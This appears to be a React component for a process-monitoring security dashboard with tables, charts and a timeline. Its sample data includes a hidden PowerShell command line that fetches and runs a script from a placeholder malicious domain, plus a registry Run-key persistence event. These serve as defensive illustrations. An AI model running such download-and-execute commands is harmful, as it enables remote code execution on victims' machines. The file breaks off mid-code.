import React, { useState, useMemo, useCallback, useRef } from 'react';
import useCyberStore from '../store/cyberStore';
import { useAdvancedDataManagement } from '../hooks/useAdvancedDataManagement';
import VirtualizedTable from '../components/VirtualizedTable';
import ProcessTreeVisualization from '../components/ProcessTreeVisualization';
import DetailedAnalysisModal from '../components/DetailedAnalysisModal';
import { 
  ResponsiveContainer,
  LineChart,
  Line,
  BarChart,
  Bar,
  PieChart,
  Pie,
  Cell,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
  Legend,
  AreaChart,
  Area,
  Sankey,
  Treemap
} from 'recharts';
import { 
  ClipboardDocumentListIcon, 
  ExclamationTriangleIcon,
  ChartBarIcon,
  DocumentTextIcon,
  PlayIcon,
  StopIcon,
  ClockIcon,
  CpuChipIcon,
  FolderIcon,
  MagnifyingGlassIcon,
  ChevronLeftIcon,
  ChevronRightIcon,
  ShieldExclamationIcon,
  CommandLineIcon,
  ServerIcon,
  EyeIcon,
  Bars3Icon,
  TableCellsIcon,
  ChartPieIcon,
  ArrowsUpDownIcon,
  FunnelIcon,
  Cog6ToothIcon
} from '@heroicons/react/24/outline';

const ITEMS_PER_PAGE = 18;

const ProcessMonitor = () => {
  try {
    const { threatData } = useCyberStore();
    const procmonData = threatData?.procmon;

    // View state management
    const [viewMode, setViewMode] = useState('table'); // table, tree, charts, timeline
    const [selectedEvent, setSelectedEvent] = useState(null);
    const [showDetailModal, setShowDetailModal] = useState(false);
    const [advancedFiltersOpen, setAdvancedFiltersOpen] = useState(false);

    // Stable timestamp reference to prevent infinite re-renders
    const baseTimestampRef = useRef(Date.now() - 300000);

    // Enhanced sample data for better visualization
    const enhancedEvents = useMemo(() => {
      const baseEvents = procmonData?.events || [];
      
      // Get existing event IDs to avoid duplicates
      const existingIds = new Set(baseEvents.map(e => e.id || `${e.timestamp}-${e.process_info?.pid}-${e.operation}`));
      
      // Generate realistic process monitoring events with enhanced details
      // Using static timestamps to prevent infinite re-renders
      const baseTimestamp = baseTimestampRef.current;
      const sampleEvents = [
        { 
          id: 'evt_001', 
          timestamp: new Date(baseTimestamp).toISOString(), 
          event_type: 'process', 
          operation: 'CreateProcess', 
          process_info: { 
            name: 'powershell.exe', 
            pid: 4832, 
            ppid: 1024, 
            path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            command_line: 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://malicious-domain.com/payload.ps1\')"',
            user: 'SYSTEM',
            session_id: 0,
            integrity_level: 'high'
          }, 
          result: 'success', 
          enrichment: { 
            threat_intel: { 
              severity: 'critical', 
              verdict: 'malicious', 
              score: 0.95,
              mitre_tactics: ['T1059.001', 'T1055', 'T1071'],
              iocs: ['malicious-domain.com', 'payload.ps1']
            }, 
            file_info: { 
              md5: 'a1b2c3d4e5f6789', 
              sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
              digital_signature: 'Invalid',
              version_info: { product_name: 'Microsoft PowerShell', file_version: '10.0.19041.1' }
            },
            behavioral_analysis: {
              anomaly_score: 9.2,
              pattern_matches: ['powershell_downloader', 'execution_policy_bypass', 'hidden_window']
            }
          },
          tags: ['suspicious_process', 'powershell_execution', 'network_download', 'high_priority']
        },
        { 
          id: 'evt_002', 
          timestamp: new Date(baseTimestamp + 30000).toISOString(), 
          event_type: 'file', 
          operation: 'WriteFile', 
          process_info: { 
            name: 'explorer.exe', 
            pid: 2456, 
            ppid: 1024, 
            path: 'C:\\Windows\\explorer.exe',
            user: 'DOMAIN\\user1',
            session_id: 1
          }, 
          target_path: 'C:\\Users\\Administrator\\Desktop\\document.txt', 
          result: 'success', 
          enrichment: { 
            threat_intel: { 
              severity: 'low', 
              verdict: 'clean', 
              score: 0.12 
            },
            file_info: {
              size: 1024,
              attributes: ['normal']
            }
          },
          tags: ['file_operation', 'user_activity']
        },
        // Add more comprehensive sample data...
        { 
          id: 'evt_003', 
          timestamp: new Date(baseTimestamp + 60000).toISOString(), 
          event_type: 'registry', 
          operation: 'RegSetValue', 
          process_info: { 
            name: 'malware.exe', 
            pid: 6789, 
            ppid: 4832, 
            path: 'C:\\Temp\\malware.exe',
            command_line: 'malware.exe --persist --stealth',
            user: 'DOMAIN\\user1'
          }, 
          target_path: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\evil', 
          result: 'success', 
          enrichment: { 
            threat_intel: { 
              severity: 'critical', 
              verdict: 'malicious', 
              score: 0.97,
              mitre_tactics: ['T1547.001'],
              iocs: ['evil registry key', 'persistence mechanism']
            }, 
            file_info: { 
              md5: 'deadbeef1234567', 
              digital_signature: 'Not signed',
              creation_time: new Date(baseTimestamp + 90000).toISOString()
            },
            behavioral_analysis: {
              anomaly_score: 9.8,
              pattern_matches: ['registry_persistence', 'unsigned_executable', 'temp_directory_execution']
            }
          },
          tags: ['malware', 'persistence', 'registry_modification', 'critical']
        }
        // Continue with more sample events...
      ].filter(event => !existingIds.has(event.id));

      const allEvents = [...baseEvents, ...sampleEvents];
      
      return allEvents.map(event => ({
        ...event,
        threat_score: event.enrichment?.threat_intel?.score || 0,
        risk_level: event.enrichment?.threat_intel?.score > 0.8 ? 'high' : 
                   event.enrichment?.threat_intel?.score > 0.5 ? 'medium' : 'low',
        process_name: event.process_info?.name || 'unknown',
        pid: event.process_info?.pid || 0,
        file_suspicious: event.enrichment?.file_info?.digital_signature?.includes('Not signed') || 
                        event.enrichment?.file_info?.digital_signature?.includes('Invalid'),
        display_name: `${event.process_info?.name || 'Unknown'} (PID: ${event.process_info?.pid || 'N/A'})`
      }));
    }, [procmonData]);

    // Advanced data management with performance optimizations
    const dataManager = useAdvancedDataManagement(enhancedEvents, {
      chunkSize: 100,
      enableVirtualization: true,
      enableCaching: true,
      enableIndexing: true,
      searchFields: ['process_info.name', 'operation', 'target_path', 'process_info.command_line', 'tags'],
      sortFields: ['timestamp', 'threat_score', 'process_name', 'operation', 'event_type'],
      filterFields: ['event_type', 'enrichment.threat_intel.severity', 'result', 'risk_level']
    });

    // Handle row selection for detailed analysis
    const handleRowClick = useCallback((event) => {
      setSelectedEvent(event);
      setShowDetailModal(true);
    }, []);

    // Process tree data for visualization
    const processTreeData = useMemo(() => {
      return enhancedEvents.filter(e => e.event_type === 'process');
    }, [enhancedEvents]);

    // Advanced filter configurations
    const advancedFilters = useMemo(() => [
      {
        field: 'event_type',
        label: 'Event Type',
        type: 'select',
        options: [
          { value: 'all', label: 'All Types' },
          { value: 'process', label: 'Process Events' },
          { value: 'file', label: 'File Operations' },
          { value: 'registry', label: 'Registry Changes' },
          { value: 'network', label: 'Network Activity' }
        ]
      },
      {
        field: 'enrichment.threat_intel.severity',
        label: 'Threat Severity',
        type: 'select',
        options: [
          { value: 'all', label: 'All Severities' },
          { value: 'critical', label: 'Critical' },
          { value: 'high', label: 'High' },
          { value: 'medium', label: 'Medium' },
          { value: 'low', label: 'Low' }
        ]
      },
      {
        field: 'threat_score',
        label: 'Threat Score',
        type: 'range',
        min: 0,
        max: 1,
        step: 0.1
      },
      {
        field: 'result',
        label: 'Operation Result',
        type: 'select',
        options: [
          { value: 'all', label: 'All Results' },
          { value: 'success', label: 'Success' },
          { value: 'failed', label: 'Failed' },
          { value: 'access_denied', label: 'Access Denied' }
        ]
      }
    ], []);

    // Virtual table columns configuration
    const tableColumns = useMemo(() => [
      {
        key: 'timestamp',
        title: 'Timestamp',
        width: '200px',
        sortable: true,
        render: (item) => (
          <div className="text-sm">
            <div className="font-medium text-gray-900 dark:text-white">
              {new Date(item.timestamp).toLocaleDateString()}
            </div>
            <div className="text-gray-500 dark:text-gray-400">
              {new Date(item.timestamp).toLocaleTimeString()}
            </div>
          </div>
        )
      },
      {
        key: 'event_type',
        title: 'Type',
        width: '120px',
        sortable: true,
        render: (item) => (
          <div className="flex items-center">
            <div className={`p-2 rounded-full mr-2 ${getEventTypeColor(item.event_type)}`}>
              {getEventTypeIcon(item.event_type)}
            </div>
            <span className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${getEventTypeColor(item.event_type)}`}>
              {item.event_type}
            </span>
          </div>
        )
      },
      {
        key: 'operation',
        title: 'Operation',
        width: '150px',
        sortable: true,
        render: (item) => (
          <span className="text-sm font-medium text-gray-900 dark:text-white">
            {item.operation}
          </span>
        )
      },
      {
        key: 'process_name',
        title: 'Process',
        width: '200px',
        sortable: true,
        render: (item) => (
          <div className="text-sm">
            <div className="font-medium text-gray-900 dark:text-white">
              {item.process_info?.name || 'N/A'}
            </div>
            <div className="text-gray-500 dark:text-gray-400">
              PID: {item.process_info?.pid || 'N/A'}
            </div>
          </div>
        )
      },
      {
        key: 'threat_score',
        title: 'Threat Level',
        width: '150px',
        sortable: true,
        render: (item) => (
          <div className="flex flex-col space-y-1">
            {item.enrichment?.threat_intel?.severity && (
              <span className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${getSeverityColor(item.enrichment.threat_intel.severity)}`}>
                {item.enrichment.threat_intel.severity}
              </span>
            )}
            <div className="text-xs text-gray-500 dark:text-gray-400">
              Score: {(item.threat_score * 100).toFixed(0)}%
            </div>
          </div>
        )
      },
      {
        key: 'result',
        title: 'Result',
        width: '100px',
        sortable: true,
        render: (item) => (
          <span className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${
            item.result === 'success' ? 'bg-green-100 dark:bg-green-900 text-green-800 dark:text-green-200' :
            'bg-red-100 dark:bg-red-900 text-red-800 dark:text-red-200'
          }`}>
            {item.result}
          </span>
        )
      },
      {
        key: 'actions',
        title: 'Actions',
        width: '100px',
        render: (item) => (
          <button
            onClick={(e) => {
              e.stopPropagation();
              handleRowClick(item);
            }}
            className="inline-flex items-center px-2 py-1 border border-gray-300 dark:border-gray-600 rounded-md text-xs font-medium text-gray-700 dark:text-gray-300 bg-white dark:bg-gray-700 hover:bg-gray-50 dark:hover:bg-gray-600"
          >
            <EyeIcon className="h-4 w-4 mr-1" />
            View
          </button>
        )
      }
    ], []);

    // Chart data calculations
    const eventTypeData = useMemo(() => [
      { name: 'Process', value: enhancedEvents.filter(e => e.event_type === 'process').length, color: '#3B82F6' },
      { name: 'File', value: enhancedEvents.filter(e => e.event_type === 'file').length, color: '#10B981' },
      { name: 'Registry', value: enhancedEvents.filter(e => e.event_type === 'registry').length, color: '#F59E0B' },
      { name: 'Network', value: enhancedEvents.filter(e => e.event_type === 'network').length, color: '#EF4444' }
    ], [enhancedEvents]);

    const severityData = useMemo(() => [
      { name: 'Critical', value: enhancedEvents.filter(e => e.enrichment?.threat_intel?.severity === 'critical').length, color: '#DC2626' },
      { name: 'High', value: enhancedEvents.filter(e => e.enrichment?.threat_intel?.severity === 'high').length, color: '#EA580C' },
      { name: 'Medium', value: enhancedEvents.filter(e => e.enrichment?.threat_intel?.severity === 'medium').length, color: '#CA8A04' },
      { name: 'Low', value: enhancedEvents.filter(e => e.enrichment?.threat_intel?.severity === 'low').length, color: '#65A30D' }
    ], [enhancedEvents]);

    const timelineData = useMemo(() => {
      return enhancedEvents.slice(-20).map((event, index) => ({
        time: new Date(event.timestamp).toLocaleTimeString(),
        events: 1,
        threats: event.threat_score > 0.7 ? 1 : 0,
        critical: event.enrichment?.threat_intel?.severity === 'critical' ? 1 : 0
      }));
    }, [enhancedEvents]);

    const getEventTypeIcon = (eventType) => {
      switch (eventType) {
        case 'process':
          return <PlayIcon className="h-5 w-5" />;
        case 'file':
          return <DocumentTextIcon className="h-5 w-5" />;
        case 'registry':
          return <ClipboardDocumentListIcon className="h-5 w-5" />;
        case 'network':
          return <ChartBarIcon className="h-5 w-5" />;
        default:
          return <ClockIcon className="h-5 w-5" />;
      }
    };

    const getEventTypeColor = (eventType) => {
      switch (eventType) {
        case 'process':
          return 'bg-blue-100 dark:bg-blue-900 text-blue-800 dark:text-blue-200';
        case 'file':
          return 'bg-green-100 dark:bg-green-900 text-green-800 dark:text-green-200';
        case 'registry':
          return 'bg-yellow-100 dark:bg-yellow-900 text-yellow-800 dark:text-yellow-200';
        case 'network':
          return 'bg-red-100 dark:bg-red-900 text-red-800 dark:text-red-200';
        default:
          return 'bg-gray-100 dark:bg-gray-700 text-gray-800 dark:text-gray-200';
      }
    };

    const getSeverityColor = (severity) => {
      switch (severity) {
        case 'critical':
          return 'bg-red-100 dark:bg-red-900 text-red-800 dark:text-red-200';
        case 'high':
          return 'bg-orange-100 dark:bg-orange-900 text-orange-800 dark:text-orange-200';
        case 'medium':
          return 'bg-yellow-100 dark:bg-yellow-900 text-yellow-800 dark:text-yellow-200';
        case 'low':
          return 'bg-green-100 dark:bg-green-900 text-green-800 dark:text-green-200';
        default:
          return 'bg-gray-100 dark:bg-gray-700 text-gray-800 dark:text-gray-200';
      }
    };

    const CustomTooltip = ({ active, payload, label }) => {
      if (active && payload && payload.length) {
        return (
          <div className="p-3 rounded-lg shadow-lg border bg-white dark:bg-gray-800 border-gray-200 dark:border-gray-600 text-gray-900 dark:text-white">
            <p className="font-medium">{label}</p>
            {payload.map((entry, index) => (
              <p key={index} style={{ color: entry.color }} className="text-sm">
                {entry.name}: {entry.value}
              </p>
            ))}
          </div>
        );
      }
      return null;
    };

    if (!procmonData) {
      return (
        <div className="p-6">
          <div className="text-center py-12">
            <ClipboardDocumentListIcon className="mx-auto h-12 w-12 text-gray-400 dark:text-gray-500" />
            <h3 className="mt-2 text-sm font-medium text-gray-900 dark:text-white">No process monitor data</h3>
            <p className="mt-1 text-sm text-gray-500 dark:text-gray-400">
              Process monitoring data will appear here when available.
            </p>
          </div>
        </div>
      );
    }

    return (
      <div className="space-y-6">
        {/* Header */}
        <div className="flex justify-between items-center">
          <div>
            <h1 className="text-2xl font-bold text-gray-900 dark:text-white">Process Monitor</h1>
            <p className="mt-1 text-gray-600 dark:text-gray-400">
              Real-time monitoring of process activities and behavioral analysis
            </p>
          </div>
          
          {/* View Mode Selector */}
          <div className="flex space-x-2 bg-gray-100 dark:bg-gray-700 p-1 rounded-lg">
            {[
              { key: 'table', label: 'Table', icon: TableCellsIcon },
              { key: 'tree', label: 'Process Tree', icon: Bars3Icon },
              { key: 'charts', label: 'Analytics', icon: ChartPieIcon },
              { key: 'timeline', label: 'Timeline', icon: ClockIcon }
            ].map(({ key, label, icon: Icon }) => (
              <button
                key={key}
                onClick={() => setViewMode(key)}
                className={`flex items-center px-3 py-2 rounded-md text-sm font-medium transition-colors ${
                  viewMode === key
                    ? 'bg-white dark:bg-gray-600 text-blue-600 dark:text-blue-400 shadow'
                    : 'text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white'
                }`}
              >
                <Icon className="h-4 w-4 mr-2" />
                {label}
              </button>
            ))}
          </div>
        </div>

        {/* Enhanced Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-6 gap-4">
          <div className="bg-white dark:bg-gray-800 p-4 rounded-lg border border-gray-200 dark:border-gray-700">
            <div className="flex items-center">
              <ClipboardDocumentListIcon className="h-8 w-8 text-blue-500" />
              <div className="ml-3">
                <p className="text-sm text-gray-500 dark:text-gray-400">Total Events</p>
                <p className="text-2xl font-bold text-gray-900 dark:text-white">
                  {dataManager.stats.totalRecords.toLocaleString()}
                </p>
              </div>
            </div>
          </div>
          
          <div className="bg-white dark:bg-gray-800 p-4 rounded-lg border border-gray-200 dark:border-gray-700">
            <div className="flex items-center">
              <ExclamationTriangleIcon className="h-8 w-8 text-red-500" />
              <div className="ml-3">
                <p className="text-sm text-gray-500 dark:text-gray-400">High Risk</p>
                <p className="text-2xl font-bold text-gray-900 dark:text-white">
                  {enhancedEvents.filter(e => e.risk_level === 'high').length}
                </p>
              </div>
            </div>
          </div>
          
          <div className="bg-white dark:bg-gray-800 p-4 rounded-lg border border-gray-200 dark:border-gray-700">
            <div className="flex items-center">
              <CpuChipIcon className="h-8 w-8 text-green-500" />
              <div className="ml-3">
                <p className="text-sm text-gray-500 dark:text-gray-400">Active Processes</p>
                <p className="text-2xl font-bold text-gray-900 dark:text-white">
                  {new Set(enhancedEvents.map(e => e.pid)).size}
                </p>
              </div>
            </div>
          </div>
          
          <div className="bg-white dark:bg-gray-800 p-4 rounded-lg border border-gray-200 dark:border-gray-700">
            <div className="flex items-center">
              <ShieldExclamationIcon className="h-8 w-8 text-orange-500" />
              <div className="ml-3">
                <p className="text-sm text-gray-500 dark:text-gray-400">Unsigned Files</p>
                <p className="text-2xl font-bold text-gray-900 dark:text-white">
                  {enhancedEvents.filter(e => e.file_suspicious).length}
                </p>
              </div>
            </div>
          </div>

          <div className="bg-white dark:bg-gray-800 p-4 rounded-lg border border-gray-200 dark:border-gray-700">
            <div className="flex items-center">
              <FunnelIcon className="h-8 w-8 text-purple-500" />
              <div className="ml-3">
                <p className="text-sm text-gray-500 dark:text-gray-400">Filtered</p>
                <p className="text-2xl font-bold text-gray-900 dark:text-white">
                  {dataManager.stats.filteredRecords.toLocaleString()}
                </p>
              </div>
            </div>
          </div>

          <div className="bg-white dark:bg-gray-800 p-4 rounded-lg border border-gray-200 dark:border-gray-700">
            <div className="flex items-center">
              <Cog6ToothIcon className="h-8 w-8 text-indigo-500" />
              <div className="ml-3">
                <p className="text-sm text-gray-500 dark:text-gray-400">Cache Hit</p>
                <p className="text-2xl font-bold text-gray-900 dark:text-white">
                  {dataManager.stats.filterCacheSize + dataManager.stats.sortCacheSize}
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Advanced Search and Filter Controls */}
        <div className="bg-white dark:bg-gray-800 p-4 rounded-lg border border-gray-200 dark:border-gray-700">
          <div className="flex flex-col space-y-4">
            {/* Search Bar */}
            <div className="flex items-center space-x-4">
              <div className="flex-1 relative">
                <MagnifyingGlassIcon className="absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
                <input
                  type="text"
                  placeholder="Search processes, operations, command lines, paths..."
                  value={dataManager.searchTerm}
                  onChange={(e) => dataManager.updateSearch(e.target.value)}
                  className="w-full pl-10 pr-4 py-3 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-white dark:bg-gray-700 text-gray-900 dark:text-white"
                />
              </div>
              
              <button
                onClick={() => setAdvancedFiltersOpen(!advancedFiltersOpen)}
                className={`flex items-center px-4 py-3 border rounded-lg font-medium transition-colors ${
                  advancedFiltersOpen 
                    ? 'border-blue-500 bg-blue-50 dark:bg-blue-900/20 text-blue-700 dark:text-blue-300'
                    : 'border-gray-300 dark:border-gray-600 text-gray-700 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-700'
                }`}
              >
                <FunnelIcon className="h-5 w-5 mr-2" />
                Advanced Filters
              </button>

              <button
                onClick={dataManager.clearFilters}
                className="flex items-center px-4 py-3 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-700 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-700"
              >
                Clear All
              </button>
            </div>

            {/* Advanced Filters Panel */}
            {advancedFiltersOpen && (
              <div className="grid grid-cols-1 md:grid-cols-4 gap-4 p-4 bg-gray-50 dark:bg-gray-700 rounded-lg">
                {advancedFilters.map((filter) => (
                  <div key={filter.field}>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      {filter.label}
                    </label>
                    {filter.type === 'select' ? (
                      <select
                        value={dataManager.filters[filter.field] || 'all'}
                        onChange={(e) => dataManager.updateFilter(filter.field, e.target.value)}
                        className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-white dark:bg-gray-700 text-gray-900 dark:text-white"
                      >
                        {filter.options.map(option => (
                          <option key={option.value} value={option.value}>
                            {option.label}
                          </option>
                        ))}
                      </select>
                    ) : filter.type === 'range' ? (
                      <div className="space-y-2">
                        <input
                          type="range"
                          min={filter.min}
                          max={filter.max}
                          step={filter.step}
                          value={dataManager.filters[filter.field] || filter.min}
                          onChange={(e) => dataManager.updateFilter(filter.field, parseFloat(e.target.value))}
                          className="w-full"
                        />
                        <div className="text-xs text-gray-500 text-center">
                          {dataManager.filters[filter.field] || filter.min} - {filter.max}
                        </div>
                      </div>
                    ) : (
                      <input
                        type="text"
                        value={dataManager.filters[filter.field] || ''}
                        onChange={(e) => dataManager.updateFilter(filter.field, e.target.value)}
                        className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-white dark:bg-gray-700 text-gray-900 dark:text-white"
                      />
                    )}
                  </div>
                ))}
              </div>
            )}

            {/* Quick Stats */}
            <div className="flex items-center justify-between text-sm text-gray-500 dark:text-gray-400">
              <span>
                Showing {dataManager.stats.filteredRecords.toLocaleString()} of {dataManager.stats.totalRecords.toLocaleString()} events
                {dataManager.stats.selectedRecords > 0 && ` • ${dataManager.stats.selectedRecords} selected`}
              </span>
              <div className="flex items-center space-x-4">
                <span>Search Index: {dataManager.stats.searchIndexSize.toLocaleString()} entries</span>
                <span>Cache: {dataManager.stats.filterCacheSize + dataManager.stats.sortCacheSize} items</span>
              </div>
            </div>
          </div>
        </div>

        {/* Main Content Based on View Mode */}
        {viewMode === 'table' && (
          <div className="bg-white dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700">
            <div className="p-6">
              <div className="flex justify-between items-center mb-4">
                <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
                  Process Events Table
                </h3>
                <div className="flex items-center space-x-2">
                  <button
                    onClick={() => dataManager.selectAll(true)}
                    className="px-3 py-1 text-sm border border-gray-300 dark:border-gray-600 rounded hover:bg-gray-50 dark:hover:bg-gray-700"
                  >
                    Select Page
                  </button>
                  <button
                    onClick={() => dataManager.selectAll(false)}
                    className="px-3 py-1 text-sm border border-gray-300 dark:border-gray-600 rounded hover:bg-gray-50 dark:hover:bg-gray-700"
                  >
                    Select All
                  </button>
                  <button
                    onClick={dataManager.clearSelection}
                    className="px-3 py-1 text-sm border border-gray-300 dark:border-gray-600 rounded hover:bg-gray-50 dark:hover:bg-gray-700"
                  >
                    Clear Selection
                  </button>
                </div>
              </div>
              
              <VirtualizedTable
                data={dataManager.data}
                columns={tableColumns}
                rowHeight={80}
                maxHeight={600}
                onRowClick={handleRowClick}
                selectedIds={dataManager.selectedItems}
              />
              
              {/* Pagination Controls */}
              {dataManager.pagination.totalPages > 1 && (
                <div className="flex items-center justify-between mt-6">
                  <div className="text-sm text-gray-500 dark:text-gray-400">
                    {dataManager.pagination.startItem}-{dataManager.pagination.endItem} of {dataManager.pagination.totalItems.toLocaleString()}
                  </div>
                  <div className="flex items-center space-x-2">
                    <button
                      onClick={() => dataManager.setCurrentPage(Math.max(1, dataManager.pagination.currentPage - 1))}
                      disabled={!dataManager.pagination.hasPrevious}
                      className="px-3 py-1 border border-gray-300 dark:border-gray-600 rounded-md text-sm disabled:opacity-50 bg-white dark:bg-gray-700 text-gray-900 dark:text-white hover:bg-gray-50 dark:hover:bg-gray-600"
                    >
                      <ChevronLeftIcon className="h-4 w-4" />
                    </button>
                    <span className="px-3 py-1 text-sm">
                      Page {dataManager.pagination.currentPage} of {dataManager.pagination.totalPages}
                    </span>
                    <button
                      onClick={() => dataManager.setCurrentPage(Math.min(dataManager.pagination.totalPages, dataManager.pagination.currentPage + 1))}
                      disabled={!dataManager.pagination.hasNext}
                      className="px-3 py-1 border border-gray-300 dark:border-gray-600 rounded-md text-sm disabled:opacity-50 bg-white dark:bg-gray-700 text-gray-900 dark:text-white hover:bg-gray-50 dark:hover:bg-gray-600"
                    >
                      <ChevronRightIcon className="h-4 w-4" />
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {viewMode === 'tree' && (
          <ProcessTreeVisualization
            processData={processTreeData}
            onProcessSelect={handleRowClick}
          />
        )}

        {viewMode === 'charts' && (
          <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
            {/* Event Type Distribution */}
            <div className="bg-white dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700 p-6">
              <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">Event Type Distribution</h3>
              <div className="h-64">
                <ResponsiveContainer width="100%" height="100%">
                  <PieChart>
                    <Pie
                      data={eventTypeData}
                      cx="50%"
                      cy="50%"
                      labelLine={false}
                      label={({ name, percent }) => `${name} ${(percent * 100).toFixed(0)}%`}
                      outerRadius={80}
                      fill="#8884d8"
                      dataKey="value"
                    >
                      {eventTypeData.map((entry, index) => (
                        <Cell key={`cell-${index}`} fill={entry.color} />
                      ))}
                    </Pie>
                    <Tooltip content={<CustomTooltip />} />
                  </PieChart>
                </ResponsiveContainer>
              </div>
            </div>

            {/* Threat Severity */}
            <div className="bg-white dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700 p-6">
              <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">Threat Severity Levels</h3>
              <div className="h-64">
                <ResponsiveContainer width="100%" height="100%">
                  <BarChart data={severityData}>
                    <CartesianGrid strokeDasharray="3 3" stroke="#E5E7EB" />
                    <XAxis 
                      dataKey="name" 
                      stroke="#6B7280"
                      fontSize={12}
                    />
                    <YAxis stroke="#6B7280" fontSize={12} />
                    <Tooltip content={<CustomTooltip />} />
                    <Bar dataKey="value" fill="#3B82F6" />
                  </BarChart>
                </ResponsiveContainer>
              </div>
            </div>

            {/* Event Timeline */}
            <div className="bg-white dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700 p-6">
              <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">Recent Activity Timeline</h3>
              <div className="h-64">
                <ResponsiveContainer width="100%" height="100%">
                  <AreaChart data={timelineData}>
                    <CartesianGrid strokeDasharray="3 3" stroke="#E5E7EB" />
                    <XAxis 
                      dataKey="time" 
                      stroke="#6B7280"
                      fontSize={10}
                    />
                    <YAxis stroke="#6B7280" fontSize={12} />
                    <Tooltip content={<CustomTooltip />} />
                    <Area type="monotone" dataKey="events" stroke="#3B82F6" fill="#3B82F6" fillOpacity={0.6} name="Events" />
                    <Area type="monotone" dataKey="threats" stroke="#EF4444" fill="#EF4444" fillOpacity={0.6} name="Threats" />
                    <Area type="monotone" dataKey="critical" stroke="#DC2626" fill="#DC2626" fillOpacity={0.8} name="Critical" />
                  </AreaChart>
                </ResponsiveContainer>
              </div>
            </div>
          </div>
        )}

        {viewMode === 'timeline' && (
          <div className="bg-white dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700 p-6">
            <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">
              Detailed Event Timeline
            </h3>
            <div className="space-y-4 max-h-96 overflow-y-auto">
              {dataManager.allData.slice(0, 50).map((event, index) => (
                <div
                  key={`timeline-${event.id}-${index}`}
                  className={`flex items-start p-4 rounded border cursor-pointer transition-all duration-200 ${
                    event.threat_score > 0.8 ? 'border-red-200 bg-red-50 dark:border-red-800 dark:bg-red-900/20' :
                    event.threat_score > 0.5 ? 'border-orange-200 bg-orange-50 dark:border-orange-800 dark:bg-orange-900/20' :
                    'border-gray-200 bg-gray-50 dark:border-gray-700 dark:bg-gray-800'
                  } hover:shadow-md`}
                  onClick={() => handleRowClick(event)}
                >
                  <div className="flex-shrink-0 mr-4">
                    <div className={`w-3 h-3 rounded-full ${
                      event.threat_score > 0.8 ? 'bg-red-500' :
                      event.threat_score > 0.5 ? 'bg-orange-500' : 'bg-blue-500'
                    }`}></div>
                  </div>
                  <div className="flex-1">
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center space-x-2">
                        <span className="font-medium text-gray-900 dark:text-white">
                          {event.process_info?.name}
                        </span>
                        <span className={`inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium ${getEventTypeColor(event.event_type)}`}>
                          {event.event_type}
                        </span>
                        {event.enrichment?.threat_intel?.severity && (
                          <span className={`inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium ${getSeverityColor(event.enrichment.threat_intel.severity)}`}>
                            {event.enrichment.threat_intel.severity}
                          </span>
                        )}
                      </div>
                      <span className="text-sm text-gray-500">
                        {new Date(event.timestamp).toLocaleString()}
                      </span>
                    </div>
                    <p className="text-sm text-gray-600 dark:text-gray-300 mb-2">
                      <strong>{event.operation}</strong> • {event.target_path || event.process_info?.path || 'No target'}
                    </p>
                    {event.enrichment?.threat_intel?.mitre_tactics && (
                      <div className="flex flex-wrap gap-1 mb-2">
                        {event.enrichment.threat_intel.mitre_tactics.map((tactic, tacticIndex) => (
                          <span
                            key={tacticIndex}
                            className="inline-flex items-center px-2 py-0.5 rounded text-xs bg-gray-100 dark:bg-gray-700 text-gray-800 dark:text-gray-200"
                          >
                            {tactic}
                          </span>
                        ))}
                      </div>
                    )}
                    {event.process_info?.command_line && (
                      <code className="block text-xs bg-gray-100 dark:bg-gray-700 p-2 rounded mt-2 overflow-x-auto">
                        {event.process_info.command_line.length > 100 ? 
                          `${event.process_info.command_line.substring(0, 100)}...` : 
                          event.process_info.command_line}
                      </code>
                    )}
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Process Analysis Summary */}
        <div className="bg-white dark:bg-gray-800 shadow rounded-lg">
          <div className="px-4 py-5 sm:p-6">
            <h3 className="text-lg leading-6 font-medium text-gray-900 dark:text-white mb-4">
              Advanced Process Analysis Summary
            </h3>
            <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">
              <div>
                <dt className="text-sm font-medium text-gray-500 dark:text-gray-400">Most Active Process</dt>
                <dd className="mt-1 text-sm text-gray-900 dark:text-white">
                  {Object.entries(
                    enhancedEvents.reduce((acc, e) => {
                      const name = e.process_name;
                      acc[name] = (acc[name] || 0) + 1;
